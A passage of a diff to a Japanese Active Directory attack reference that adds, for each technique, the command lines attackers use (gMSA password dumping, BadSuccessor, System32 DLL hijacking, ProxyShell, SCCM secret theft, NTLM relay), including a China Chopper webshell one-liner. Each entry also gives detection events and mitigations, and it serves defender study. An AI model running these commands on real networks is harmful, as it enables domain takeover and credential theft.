と移行元標的の双方向リンク〔片方向リンクのみでは不成立となるよう msDS-SupersededManagedAccountLink／msDS-SupersededServiceAccountState 等の対応関係〕を検証してからチケット発行）したが、BetterSuccessor / dMSA Ouroboros 等のパッチ後バイパスが同属性を別手順で悪用し依然成立するため、OU-ACL 堅牢化と検知が必須。",
     "tools": "BloodHound (WriteGMSAPassword/ReadGMSAPassword エッジ), PowerView (Set-DomainObject), PowerShell ActiveDirectory モジュール (Set/Get-ADServiceAccount), GMSAPasswordReader, gMSADumper.py, NetExec/CrackMapExec (--gmsa), DSInternals (ConvertFrom-ADManagedPasswordBlob), Impacket, Rubeus, SharpSuccessor/BadSuccessor PoC (dMSA)",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "msDS-GroupMSAMembership(許可リスト)へ攻撃者ホストを追加。正規ADモジュールのため実行ファイル検知は効かず4104とLDAPの5136が頼り",
+        "q": "Set-ADServiceAccount -Identity svc_gmsa -PrincipalsAllowedToRetrieveManagedPassword attacker_host$"
+      },
+      {
+        "tool": "PowerView",
+        "t": "同じ属性をPowerViewから直接SDバイト列で上書き。4104のスクリプトブロックに`Set-DomainObject`が残る",
+        "q": "Set-DomainObject -Identity svc_gmsa -Set @{'msds-groupmsamembership'=$SDBytes}"
+      },
+      {
+        "tool": "gMSADumper",
+        "t": "許可リストに追加後、msDS-ManagedPasswordを読取りNTハッシュを算出。LDAPS封印接続での構築属性クエリのみが痕跡でプロセスログは残りにくい",
+        "q": "python3 gMSADumper.py -u svc_user -p 'Passw0rd!' -d corp.local -l dc01.corp.local"
+      },
+      {
+        "tool": "NetExec",
+        "t": "`--gmsa`で到達可能な全gMSAのパスワードを一括ダンプ。LDAPS接続元IPの異常が唯一の手掛かり",
+        "q": "netexec ldap dc01.corp.local -u attacker -p 'Passw0rd!' --gmsa"
+      },
+      {
+        "tool": "DSInternals",
+        "t": "正規ADモジュールで取得したblobをDSInternalsでNTハッシュへ変換。4104に`ConvertFrom-ADManagedPasswordBlob`呼出しが残る",
+        "q": "$gmsa = Get-ADServiceAccount -Identity svc_gmsa -Properties 'msDS-ManagedPassword'\nConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword'"
+      },
+      {
+        "tool": "SharpSuccessor",
+        "t": "OUへのCreateChild権限からdMSAを新規作成し移行元アカウントに成りすます(BadSuccessor)。`add`と`/impersonate`が決定的シグナル、DCの4741相関で見る",
+        "q": "SharpSuccessor.exe add /impersonate:Administrator /path:\"OU=Workstations,DC=corp,DC=local\" /account:svc_user /name:attacker_dMSA"
+      }
+    ],
     "detect": "(1) DC の Directory Service Changes 監査(5136)で、gMSA オブジェクトの msDS-GroupMSAMembership 属性が非 Tier-0 プリンシパルや想定外ホストから変更された事象。(2) msDS-ManagedPassword プロパティへの読取(4662、対象属性への読取 SACL 必須)が通常と異なるホスト/主体から発生。(3) MDI による LDAP 偵察検知、および dMSA BadSuccessor 検知(MDI アラート)、managed password を狙う LDAP クエリ。(4) Kerberos: gMSA アカウント($末尾)が本来の member ホスト以外から TGT 要求(4768)、新規ソース IP。(5) エンドポイント: GMSAPasswordReader/gMSADumper/NetExec の実行痕跡や ConvertFrom-ADManagedPasswordBlob を用いる PowerShell。テレメトリ源: DC セキュリティイベントログ(DS Changes/Kerberos)、MDI(IdentityDirectoryEvents/IdentityQueryEvents)、MDE エンドポイントプロセス、LDAP。",
     "events": "5136(msDS-GroupMSAMembership変更 / dMSA: msDS-ManagedAccountPrecededByLink=標的DN・msDS-DelegatedMSAState 1→2直接遷移), 4662(msDS-ManagedPassword読取; 要SACL / dMSA AccessMask 0x20), 4768(gMSA/dMSAとしてTGT要求), 2946(dMSA TGT発行), 4624 Type3(gMSA/dMSAネットワークログオン), 5137(dMSAオブジェクト作成)",
     "mitigate": "(1) 最小権限化: gMSA オブジェクトと配置 OU に対する過剰な Write/WriteDACL/WriteOwner/GenericAll を棚卸し・削除し、msDS-GroupMSAMembership の変更は Tier-0 のみに限定。(2) PrincipalsAllowedToRetrieveManagedPassword を定期レビューし、正確なサービスホストのみに絞る。(3) Directory Service Changes 監査と SACL を有効化（msDS-ManagedPassword の読取、msDS-GroupMSAMembership の書込を監査）。(4) gMSA を保護された Tier-0 OU に配置し、下位 Tier からの書込を拒否。(5) dMSA/BadSuccessor 対策: 全 Windows Server 2025 DC に CVE-2025-53779（2025-08 パッチ）を適用。加えて OU への msDS-DelegatedManagedServiceAccount CreateChild を制限し、msDS-ManagedAccountPrecededByLink／msDS-DelegatedMSAState を監視（正規移行=1 に対し 2 への直接遷移が悪性指標）。パッチ後も BetterSuccessor/dMSA Ouroboros 等のバイパスが残るため 5137/5136/4662(AccessMask 0x20)/2946 の検知と OU-ACL 棚卸しを継続。(6) 厳格な Tier 分離と gMSA 利用ベースラインの監視。",
@@ -8382,6 +13759,33 @@ AD.I18N.ja.attacks = [
     "summary": "SeManageVolumePrivilege(ボリューム保守)やSeTakeOwnershipPrivilege(所有権取得)を持つ低権限トークンを悪用し、C:\\Windows\\System32配下のDACL/所有権を奪って任意DLLを書き込み・置換し、SYSTEMサービスにロードさせてローカル権限昇格する手法。",
     "how": "前提: 攻撃者トークンが SeManageVolumePrivilege または SeTakeOwnershipPrivilege を保持(既定は無効状態のため AdjustTokenPrivileges で有効化)。多くはグループ経由のユーザー権利割り当て誤設定、またはサービスアカウントが保有。まず whoami /priv で保有特権を確認する。\n[SeManageVolume 経路] CsEnox の SeManageVolumeExploit.exe を実行するとこの特権で C:\\Windows(System32含む)の DACL に Authenticated Users のフルコントロールが再帰的に付与され、非管理者でも System32 が書込可能になる。ここへ、SYSTEM で動くサービスが探索するファントム/ハイジャック DLL(例: wlbsctrl.dll=IKEEXT, TSMSISrv.dll, wbemcomn.dll, WptsExtensions.dll=Task Scheduler)を msfvenom 等で生成した悪性 DLL として設置し、サービス再起動/再起動で SYSTEM ロードさせる。\n[SeTakeOwnership 経路] この特権は DACL を無視して任意オブジェクトの所有権を取得できる。takeown /f もしくは PowerShell の Set-Owner で標的 DLL/EXE(例: System32 の DLL、utilman.exe)の所有者を自分に変更 → 所有者は WRITE_DAC を持つため icacls /grant で自分にフル権限付与 → バイナリを悪性版に置換 → 特権プロセスに実行させる。鍵となるプリミティブは「特権による所有権/DACL の一方的書換 → 保護領域への任意書込 → DLL/バイナリ乗っ取り」。",
     "tools": "SeManageVolumeExploit (CsEnox), whoami /priv, takeown.exe, icacls.exe, PowerShell Set-Owner/Set-Acl, msfvenom(悪性DLL生成), 自作DLL, accesschk.exe(特権/ACL確認), Sysmon",
+    "cmd": [
+      {
+        "tool": "whoami.exe",
+        "t": "SeManageVolume/SeTakeOwnership等の保有特権を確認する定番の偵察コマンド",
+        "q": "whoami.exe /priv"
+      },
+      {
+        "tool": "SeManageVolume",
+        "t": "SeManageVolumePrivilegeでC:\\(System32含む)のDACLを再帰的にAuthenticated Usersへ全開放する引数無しの一発ツール",
+        "q": "SeManageVolumeExploit.exe"
+      },
+      {
+        "tool": "takeown.exe",
+        "t": "SeTakeOwnershipPrivilegeでDACLを無視し保護バイナリの所有権を奪取。System32配下への`/f`実行は稀で強シグナル",
+        "q": "takeown.exe /f C:\\Windows\\System32\\Utilman.exe"
+      },
+      {
+        "tool": "icacls.exe",
+        "t": "所有権取得直後にWRITE_DACで自アカウントへフル権限を付与。所有権変更の直後に続くicaclsの流れが典型",
+        "q": "icacls.exe C:\\Windows\\System32\\Utilman.exe /grant svc_user:F"
+      },
+      {
+        "tool": "Set-Owner",
+        "t": "PowerShellネイティブのtakeown代替。4104に`Set-Owner`と対象パスが同時に残る",
+        "q": "Set-Owner -Path C:\\Windows\\System32\\Printconfig.dll -Account 'corp.local\\svc_user'"
+      }
+    ],
     "detect": "主要シグナル: (1) TrustedInstaller/TiWorker/msiexec 以外のプロセスによる System32/wbem 配下への .dll 書込・作成(DeviceFileEvents / Sysmon 11 / 4663)。(2) takeown.exe・icacls.exe が System32 や sethc/utilman 等のシステムバイナリに対し /setowner・/grant を実行(4688 / DeviceProcessEvents / ProcessRollup2)。(3) 特権使用: SeTakeOwnershipPrivilege による所有権取得は 4674(特権オブジェクト操作)を発火、DACL/所有者変更は 4670。特権有効化は 4703。SeTakeOwnership は 4672 の対象特権。(4) 既知ファントム DLL 名(wlbsctrl.dll 等)が予期しない SHA256 で SYSTEM プロセスにロード(Sysmon 7 / DeviceImageLoadEvents)。テレメトリ源: MDE Device*、Sysmon(1/7/11)、Windows セキュリティ監査(オブジェクトアクセス/機微特権使用/認可ポリシー変更)、ファイル整合性監視。",
     "events": "4688(takeown/icacls実行), 4703(特権の調整), 4674(特権オブジェクト操作:SeTakeOwnership), 4670(所有者/アクセス許可の変更), 4663(System32ファイル書込), 4672(SeTakeOwnership特権割当:新規ログオン), Sysmon 11(DLL作成), Sysmon 7(不正DLLロード)",
     "mitigate": "(1) SeManageVolumePrivilege・SeTakeOwnershipPrivilege を管理者以外へ割り当てない — グループポリシーの「ボリュームの保守タスクを実行」「ファイルとその他のオブジェクトの所有権の取得」を Administrators のみに限定し、AD 全体の GPO/URA を棚卸し。(2) サービスアカウントに不要なこれらの特権を付与しない。(3) System32 のファントム DLL を排除 — 該当サービスの不要停止、既知欠落 DLL(wlbsctrl.dll 等)の監視。(4) WDAC/AppLocker で署名済み DLL のみ許可し、System32 への非 TrustedInstaller 書込を検知/阻止。(5) 機微特権使用・オブジェクトアクセス監査を有効化し 4674/4670/4703 を収集。(6) LSA 保護/攻撃対象領域縮小、定期的な whoami /priv・accesschk による特権逸脱検査。",
@@ -8427,6 +13831,33 @@ AD.I18N.ja.attacks = [
     "summary": "Microsoft Exchange Server（オンプレ）のOWA/Autodiscover/ECPに存在するSSRF＋任意ファイル書き込み/バックエンドPowerShell RCEを連鎖させる脆弱性群（ProxyLogon/ProxyShell/ProxyNotShell）で、認証前あるいは低権限からExchangeマシンアカウント（多くはSYSTEM/高権限）としてASPX Webシェルを設置しコード実行に至る、AD環境で最も悪用されたRCEチェーンの一つ。",
     "how": "前提: インターネット/内部から到達可能な未パッチのExchange 2013/2016/2019。ProxyLogon(CVE-2021-26855)は認証前、ProxyShell(CVE-2021-34473)は認証前(Autodiscoverパス混同)、ProxyNotShell(CVE-2022-41040)は任意の有効メールボックス認証情報が必要。手口: (1) SSRFでフロントエンドを踏み台にバックエンドEWS/PowerShell/DDIエンドポイントへ到達（ProxyLogonはX-BEResource Cookie付きPOST /ecp/DDIService.svc、ProxyShellは /autodiscover/autodiscover.json?@evil/powershell + X-Rps-CATトークン偽造）。(2) CVE-2021-27065（ECP OABの仮想ディレクトリ設定書き換え）や New-MailboxExportRequest でPST/ASPXをWeb公開ディレクトリに書き込み。(3) China Chopper等の小型Webシェルを owa\\auth・aspnet_client・FrontEnd\\HttpProxy\\ecp\\auth 配下に設置。(4) Webシェル経由で w3wp.exe→cmd.exe/powershell.exe を実行し、procdump/comsvcs.dllでLSASS、ntdsutilでNTDS.ditを窃取、GodPotato/PrintSpooferで昇格、DCへ横展開。主要プリミティブ: SSRFによるバックエンド偽装認証（HTTP machine/SYSTEMコンテキスト）＋任意ファイル書き込み。",
     "tools": "proxylogon.py / proxyshell.py PoC, Metasploit (exchange_proxyshell_rce / proxynotshell), China Chopper, ASPXSpy, ReGeorg, Nishang, procdump / comsvcs.dll MiniDump, ntdsutil, GodPotato / PrintSpoofer, PowerCat, Test-ProxyLogon.ps1",
+    "cmd": [
+      {
+        "tool": "Test-ProxyLogon",
+        "t": "Microsoft公式のIoC検査スクリプト。OWA/ECPログとファイルシステムを横断しHafnium型侵害の痕跡を検出",
+        "q": "Get-ExchangeServer | .\\Test-ProxyLogon.ps1 -OutPath C:\\Temp\\Logs"
+      },
+      {
+        "tool": "ProxyShell.py",
+        "t": "kh4sh3i版PoC。メールアドレス未特定でも自動列挙し`-u`にExchangeのURLのみを渡す単純な引数構成",
+        "q": "python3 ProxyShell.py -u https://10.0.0.30"
+      },
+      {
+        "tool": "China Chopper",
+        "t": "侵害成立後に設置される極小ASPX Webシェル。`eval(Request.Item[...])`の1行パターンがファイル内容の決定的シグネチャ",
+        "q": "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"password\"],\"unsafe\");%>"
+      },
+      {
+        "tool": "w3wp.exe",
+        "t": "WebシェルからのRCEはIISワーカープロセスが子プロセスを生成する形で現れる。w3wp.exeの子プロセス自体が高忠実度の異常",
+        "q": "w3wp.exe -> cmd.exe /c whoami"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "ExSetup.exeの実バージョンでExchangeパッチレベルを確認。KB番号よりビルド番号の方が確実",
+        "q": "(Get-Command \"$env:ExchangeInstallPath\\bin\\ExSetup.exe\").FileVersionInfo.FileVersion"
+      }
+    ],
     "detect": "主要シグナル: (1) IIS W3SVC ログ (C:\\inetpub\\logs\\LogFiles\\W3SVC1) に ProxyLogon固有の X-BEResource Cookie付き POST /ecp/DDIService.svc、または ProxyShell固有の /autodiscover/autodiscover.json?...@... /powershell、異常な /mapi/nspi URLと200応答。(2) Exchange Webディレクトリ(owa\\auth, aspnet_client, ecp\\auth, FrontEnd\\HttpProxy)への新規.aspx/.ashx作成（Sysmon EID11 / DeviceFileEvents）。(3) w3wp.exe / UMWorkerProcess.exe が cmd.exe / powershell.exe / net.exe / csc.exe を子プロセス生成（4688 / Sysmon EID1）。(4) MSExchange Management 運用ログに非管理者アカウントによる New-MailboxExportRequest / Set-OabVirtualDirectory。(5) PowerShellスクリプトブロック(4104)にエンコード済みペイロード。Microsoft提供のTest-ProxyLogon.ps1・HttpProxyログ解析が有効。",
     "events": "4688(w3wp/UMWorkerProcess→cmd/powershell), Sysmon 1(プロセス生成), Sysmon 11(Webシェル.aspx作成), 4104(PSスクリプトブロック), MSExchange Management(New-MailboxExportRequest / Set-OabVirtualDirectory), IIS W3SVC log(POST /ecp/DDIService.svc, /autodiscover.json?@)",
     "mitigate": "(1) 該当セキュリティ更新を即時適用: ProxyLogon=2021年3月SU、ProxyShell=2021年5/7月CU/SU、ProxyNotShell=2022年11月SU。旧CUは適用前にCU更新が必要。(2) 恒久パッチ前はMicrosoft提供のEOMT.ps1／URL Rewrite緩和ルール（`.*autodiscover\\.json.*Powershell.*` を含むリクエストを遮断）を適用。(3) 非管理者のExchangeリモートPowerShellを無効化(Set-User -RemotePowerShellEnabled $false)。(4) Extended Protection(拡張保護)を有効化しトークン中継/偽装を封じる。(5) OWA/ECP/PowerShell仮想ディレクトリの外部公開を停止しVPN/リバースプロキシ経由に限定。(6) MSERT/Safety Scannerで既知Webシェル駆除、Webディレクトリの整合性監視と書き込み権限最小化。(7) サポート終了のExchange 2013等はExchange Online/新版へ移行。",
@@ -8467,6 +13898,38 @@ AD.I18N.ja.attacks = [
     "summary": "SCCM/MECM クライアントのマシンポリシーに埋め込まれた Network Access Account(NAA)・タスクシーケンス変数・コレクション変数の秘密情報を、ローカル DPAPI 復号(SYSTEM)または管理ポイント(MP)への不正デバイス登録＋ポリシー要求によって抽出し、平文の資格情報(多くはドメインアカウント)を奪取する手法。",
     "how": "前提: (A) ローカル抽出はクライアント上のローカル管理者→SYSTEM 昇格が必要。(B) リモート抽出は MP への HTTP(S) 到達性が必要で、既定の自動承認環境ではドメイン参加コンピュータアカウント程度で足りる(手動承認なら不正登録が必要)。ローカル手法: SharpSCCM.exe local secrets が WMI 名前空間 root\\ccm\\policy\\Machine\\ActualConfig の CCM_NetworkAccessAccount クラス(NetworkAccessUsername/NetworkAccessPassword)を読み、SYSTEM の DPAPI マスターキー(C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18)で PolicySecret(DPAPI blob)を復号。TS/コレクション変数も同様に ActualConfig 配下に格納。リモート手法: SharpSCCM.exe get secrets が自己署名証明書を生成→MP に新規デバイスを登録→マシンポリシー割当を要求→NetworkAccessAccount ポリシー本体を取得。NAA 資格情報は登録クライアントの公開鍵で暗号化されているため、攻撃者は自身が生成した秘密鍵で復号できる(クライアント上の管理者権限不要)。PXEThief は PXE ブートメディアの変数ファイルから NAA を復号する派生手法。鍵プリミティブは「PolicySecret の DPAPI/証明書復号」。MITRE: パスワードストア/ポリシー内の資格情報奪取(T1555)、安全でない場所に保存された資格情報の悪用(T1552)。",
     "tools": "SharpSCCM (get secrets / local secrets), SCCMHunter, PXEThief, MalSCCM, sccmwtf/pysccm, CMLoot, Impacket/DonPAPI(DPAPI復号), PowerShell + WMI/CIM(Get-WmiObject root\\ccm\\policy)",
+    "cmd": [
+      {
+        "tool": "SharpSCCM",
+        "t": "ローカルのroot\\ccm\\policy\\Machine\\ActualConfigをWMI照会しSYSTEMのDPAPIでNAAを復号。事前にSYSTEM昇格が必須",
+        "q": "SharpSCCM.exe local secrets"
+      },
+      {
+        "tool": "SharpSCCM",
+        "t": "自己署名証明書で偽デバイスをMPに登録しNAAポリシーをリモート取得。管理者権限不要でMPのIISログにのみ痕跡が残る",
+        "q": "SharpSCCM.exe get secrets"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "専用ツール無しでNAAポリシーblobを直接取得。4104のスクリプトブロックにクラス名`CCM_NetworkAccessAccount`が残る",
+        "q": "Get-WmiObject -Namespace root\\ccm\\policy\\Machine\\ActualConfig -Class CCM_NetworkAccessAccount"
+      },
+      {
+        "tool": "CMLoot",
+        "t": "SCCMコンテンツライブラリ共有(SCCMContentLib$)内の全ファイルを棚卸し。大量のSMBファイル列挙が445への異常アクセスとして残る",
+        "q": "Invoke-CMLootInventory -SCCMHost sccm01.corp.local -Outfile sccmfiles.txt"
+      },
+      {
+        "tool": "CMLoot",
+        "t": "資格情報やスクリプトを含みやすい特定ファイルへ直接アクセス。ファイル名パターンへの狙い撃ちダウンロードが指紋",
+        "q": "Invoke-CMLootDownload -SingleFile \\\\sccm01.corp.local\\SCCMContentLib$\\DataLib\\SC100001.1\\x86\\MigApp.xml"
+      },
+      {
+        "tool": "DonPAPI",
+        "t": "リモートホストのDPAPI保護シークレットを一括収集・復号。Linux側実行のため端末側にプロセスログは残らない",
+        "q": "DonPAPI.py corp.local/svc_user:'Passw0rd!'@10.0.0.20"
+      }
+    ],
     "detect": "ローカル: CcmExec 以外のプロセス(SharpSCCM.exe, powershell, rundll32, dotnet)による root\\ccm\\policy\\Machine への WMI クエリ、CCM_NetworkAccessAccount 文字列を含むコマンドライン、SYSTEM DPAPI マスターキー(S-1-5-18\\Protect)へのファイルアクセス。テレメトリ: MDE DeviceProcessEvents / DeviceFileEvents、Sysmon(WMI/ImageLoad)、Microsoft-Windows-WMI-Activity/Operational。リモート: MP 上の mp_registrationmanager.log / MP_GetAuth / MP_Policy に現れる想定外ホスト名からの新規デバイス登録・ポリシー要求、短時間の登録→ポリシー取得シーケンス、非管理クライアント IP からの /ccm_system/request POST。抽出後: NAA/ドメインサービスアカウントが配布ポイント以外の新規ホストから Type3/Kerberos 認証(横展開の兆候)。",
     "events": "4688(SharpSCCM/PowerShell/WMIツール実行), 4624 Type3(抽出NAA資格情報の再利用), 4768/4769(NAAドメインアカウントのKerberos再利用), SCCMログ: mp_registrationmanager.log / MP_Policy / MP_GetAuth(不正デバイス登録・ポリシー要求)",
     "mitigate": "最優先: Network Access Account を廃止し、Enhanced HTTP + PKI 証明書 + Microsoft Entra 参加(既定で NAA 不要)へ移行。NAA が必須なら専用の低権限アカウントを用い、対話ログオン禁止・ローカル管理者権限なし・配布ポイントへの「ネットワーク経由アクセス」のみ付与し定期ローテーション。クライアント承認を自動から手動(または同一フォレストのみ)に変更し不正デバイス登録を防止。タスクシーケンス変数から資格情報を排除し機微変数としてマーク、ドメイン参加は gMSA 等を利用。SCCM インフラ(サイトサーバ/MP/SMS Provider)を Tier-0 として保護し、PXE 応答にパスワードを必須化。LAPS 展開と SharpSCCM 実行検知の導入。",
@@ -8512,6 +13975,38 @@ AD.I18N.ja.attacks = [
     "summary": "強制認証(PetitPotam/PrinterBug 等)や名前解決ポイズニング(Responder/mitm6)で取得したNTLM認証を、署名(SMB/LDAP署名)で保護されないHTTPベースのサービス — WinRM(5985/5986)、AD FS、SharePoint、AD CS Web登録(ESC8) — に ntlmrelayx で中継し、被害者権限でのコマンド実行や証明書発行を得る攻撃で、コンピューターアカウント一台のNTLMが即座に横展開・権限昇格に化ける点が脅威。",
     "how": "前提: 攻撃者がネットワーク上に立ち、(a)強制認証を起こせる(ドメイン認証済みユーザー or 認証なしのEFSRPC/MS-RPRN経路)か、(b)LLMNR/NBT-NS/mDNS/WPADをポイズニングできること。中継先HTTPサービスはNTLMを受理しEPA(Extended Protection for Authentication)未適用であること。WinRM中継で実際にコマンド実行するには、中継されるID(通常コンピューターアカウントや管理者)が標的ホストのローカル管理者である必要がある。手順: (1) `ntlmrelayx.py -t http://winrm-target:5985/wsman -smb2support` あるいは `-t https://adfs/`、AD CS の場合 `-t http://ca/certsrv/certfnsh.asp --adcs --template Machine` を起動。(2) 別窓で `Coercer coerce` / `PetitPotam.py <relay-ip> <victim-DC>` / `printerbug.py` で被害ホストから攻撃者リレーへNTLM認証を誘発、または `Responder -I eth0` でブロードキャスト応答を汚染、IPv6環境なら `mitm6 -d domain.local` でDNS/WPADを乗っ取り。(3) 被害者のNet-NTLM認証がリレーを経由してHTTP標的へ中継され、WinRMではSOAP経由でコマンド実行、AD CSでは被害マシンの証明書(→PKINITでTGT/NTLMハッシュ取得)を発行。鍵となるプリミティブは「HTTPにはSMB署名/LDAPチャネルバインディングのような既定の完全性保護が無く、EPA未設定だと中継が成立する」点。",
     "tools": "Impacket ntlmrelayx.py, Responder, PetitPotam, Coercer, printerbug.py/dementor.py (MS-RPRN/MS-EFSR), mitm6, krbrelayx, Certipy (ESC8), evil-winrm(検証)",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "中継先をWinRM(5985)の`/wsman`エンドポイントに向けSOAP経由でコマンド実行、標的側5985へのHTTP POSTが一次観測点",
+        "q": "ntlmrelayx.py -t http://192.168.1.50:5985/wsman -smb2support"
+      },
+      {
+        "tool": "Impacket",
+        "t": "AD FSのサインインエンドポイントへ中継しWSFed/SAMLトークンを奪取、統合認証エンドポイントで署名検証が働かない点が成立条件",
+        "q": "ntlmrelayx.py -t https://adfs.corp.local/adfs/ls/ -smb2support"
+      },
+      {
+        "tool": "Impacket",
+        "t": "AD CS Web登録(ESC8)へ中継し証明書を即時発行、`--adcs`と`--template`がコマンドラインの決定的シグナル",
+        "q": "ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template Machine"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "MS-EFSRPCで標的DCに攻撃者リスナーへのSMB認証を強制、EfsRpcOpenFileRaw呼び出しがDC側の445アウトバウンドとして残る",
+        "q": "python3 PetitPotam.py -u svc_user -p 'Passw0rd!' -d corp.local 10.0.0.5 dc01.corp.local"
+      },
+      {
+        "tool": "Coercer",
+        "t": "12種のRPC強制認証手法を自動選択して総当り実行、`-t`標的と`-l`リスナーの組がコマンドラインに残る",
+        "q": "Coercer.py coerce -u svc_user -p 'Passw0rd!' -d corp.local -t dc01.corp.local -l 10.0.0.5"
+      },
+      {
+        "tool": "mitm6",
+        "t": "IPv6 RA/DHCPv6でDNS/WPADを乗っ取りHTTP系サービスへの認証を誘発、`-d`ドメイン指定以外は既定値で稼働する低ノイズな起動",
+        "q": "mitm6 -d corp.local"
+      }
+    ],
     "detect": "シグナル: (1) 標的ホストでのNTLM(パッケージ NTLM)ネットワークログオン 4624 Type3 で、ソースIPが当該アカウント本来の端末ではなく攻撃者リレーホストであること。特にコンピューターアカウント($終端)がWinRMでNTLMログオンするのは異常(通常はKerberos)。(2) WinRM標的で wsmprovhost.exe が cmd/powershell 等の子プロセスを生成(リモートコマンド実行)。(3) DCでの 4776(NTLM資格情報検証)が同一アカウント・同時刻に発生し、検証元ワークステーション名がリレーホスト。(4) 強制認証の痕跡: 標的からリレーへの受動的Net-NTLM、被害DC/サーバでの lsarpc/efsrpc 名前付きパイプアクセス(5145)。テレメトリ源: 標的のSecurity/WinRM Operationalログ、DCのSecurity(4776)、MDE(DeviceProcess/DeviceNetwork/DeviceLogon)、MDI(IdentityLogonEvents の NTLM)。",
     "events": "4624(Type3/NTLM・標的), 4776(NTLM検証/DC), 4672, 4688(wsmprovhost.exe→子プロセス), WinRM Operational(Microsoft-Windows-WinRM/Operational 91/168), 5145(lsarpc/efsrpc パイプ・強制認証時), AD CS発行時 4886/4887",
     "mitigate": "(1) HTTP標的でEPA(Extended Protection for Authentication)を強制: WinRMはHTTPS(5986)+チャネルバインディング、AD FS/SharePoint/AD CS Web登録(CES/certsrv)でEPA有効化、AD CSはHTTP登録を無効化しHTTPS+EPAのみに。(2) 可能な限りNTLMを無効化/制限し(グループポリシー「ネットワークセキュリティ: NTLM を制限する」)、Kerberosを強制。(3) 強制認証経路を塞ぐ: PetitPotam対策(KB5005413、PatchGuard/NTLM経路のブロック)、DC/重要サーバでPrint Spoolerを停止。(4) LLMNR/NBT-NS/mDNS/WPADを無効化しポイズニングを防止、IPv6を使わないなら遮断してmitm6を封じる。(5) WinRMは管理サブネット限定、機械アカウントの管理者権限を最小化。(6) SMB署名/LDAP署名・チャネルバインディングを全社強制(横の中継先を減らす)。",
@@ -8557,6 +14052,33 @@ AD.I18N.ja.attacks = [
     "summary": "認証コアーション（PetitPotam/PrinterBug/DFSCoerce 等）で強制させたマシンアカウントのNTLM認証を、ntlmrelayx で rpc:// エンドポイント（MS-TSCH ITaskSchedulerService や MS-DCOM の活性化インターフェイス）へ中継し、被害ホスト上に SYSTEM 権限のスケジュールタスクを登録＝RCEを得る手法。RPC over TCP は既定で署名/EPA未強制のため SMB署名要件を回避でき、ドメイン内での横展開・特権昇格に直結する点で危険度が高い。",
     "how": "前提: ネットワーク上のポジション（同一L2/ルーティング可能）と、中継先ホストでローカル管理者権限を持つコアーション対象アカウント（マシンアカウント $ が典型。例: A$ が B の Administrators に所属、SCCM/クラスタ構成など）。手順: (1) 認証をコアーション — PetitPotam.py（MS-EFSRPC EfsRpcOpenFileRaw）, printerbug.py/SpoolSample（MS-RPRN RpcRemoteFindFirstPrinterChangeNotification）, dfscoerce.py（MS-DFSNM）, Coercer で対象（多くはDC/サーバ）に攻撃者ホストへNTLM認証させる。(2) 中継 — impacket の ntlmrelayx.py で `ntlmrelayx.py -t rpc://<target> -smb2support`（rpc:// ターゲット指定時に rpcattack.py が動作し、ITaskSchedulerService::SchRpcRegisterTask を ncacn_ip_tcp 135→動的ポートで呼び出しタスク登録。`-c` でコマンド指定）。DCOM 経路では IObjectExporter/ISystemActivator への活性化を中継。キー・プリミティブ: RPC over TCP は既定で署名/EPA未強制のため SMB署名要件を回避し、中継したマシンアカウントの管理者権限で SYSTEM としてタスク実行→即時RCE。",
     "tools": "impacket ntlmrelayx.py (rpcattack, rpc:// ターゲット), PetitPotam.py, printerbug.py/SpoolSample, dfscoerce.py, Coercer, impacket rpcdump.py, Responder（マルチキャスト誘導）",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "rpc://指定でRPCリレーサーバを起動しITaskSchedulerServiceへ中継、`-c`のコマンドがSYSTEM権限で実行されタスク名として残る",
+        "q": "ntlmrelayx.py -ip 0.0.0.0 -t rpc://10.0.0.20 -smb2support -c \"whoami\""
+      },
+      {
+        "tool": "printerbug.py",
+        "t": "MS-RPRNのRpcRemoteFindFirstPrinterChangeNotificationを叩き標的DCから攻撃者へSMB認証を強制する起点",
+        "q": "python3 printerbug.py corp.local/svc_user:'Passw0rd!'@dc01.corp.local 10.0.0.20"
+      },
+      {
+        "tool": "dfscoerce.py",
+        "t": "MS-DFSNMのNetrDfsRemoveStdRoot/AddStdRootを悪用、Spooler停止環境でもPrinterBugの代替として機能する",
+        "q": "dfscoerce.py -d corp.local -u svc_user -p 'Passw0rd!' 10.0.0.20 dc01.corp.local"
+      },
+      {
+        "tool": "Coercer",
+        "t": "複数のRPCコアーシオン手法を総当りで試行、標的にRPCフィルタ未適用だと成立しやすい",
+        "q": "Coercer.py coerce -u svc_user -p 'Passw0rd!' -d corp.local -t dc01.corp.local -l 10.0.0.20"
+      },
+      {
+        "tool": "Impacket",
+        "t": "事前偵察としてEPM上の公開RPCインターフェースを列挙、135へのRPC_C_MGMT系呼び出しが単体でもノイズ源になる",
+        "q": "rpcdump.py corp.local/svc_user:'Passw0rd!'@dc01.corp.local"
+      }
+    ],
     "detect": "検出シグナル: (1) 中継先ホストでのNTLMネットワークログオン(4624 Type3)で、アカウントがマシンアカウント($)だが送信元IPが当該マシンの実IPと不一致（＝攻撃者リレーIP）。(2) 直後に同一マシンアカウントによるスケジュールタスク登録(4698)＋TaskScheduler運用ログ106/200/201、続いて svchost/taskeng を親とする SYSTEM プロセス(4688)。(3) 攻撃者ホストからのRPC接続パターン: TCP135(エンドポイントマッパ)→高位動的ポート(49152-65535)。(4) DC側でのコアーション痕跡（EFSRPC/RPRN/DFSNMのRPC呼び出し、MDIの「Suspected NTLM relay/coercion」）。テレメトリ源: セキュリティ監査ログ(4624/4776/4698)、TaskScheduler-Operational、EDRのプロセス/ネットワーク/名前付きパイプ、Microsoft Defender for Identity。",
     "events": "4624(Type3/NTLM 中継先), 4776(NTLM検証/DC), 4698(タスク登録), TaskScheduler-Operational 106/200/201, 4688(SYSTEM子プロセス/RCE)",
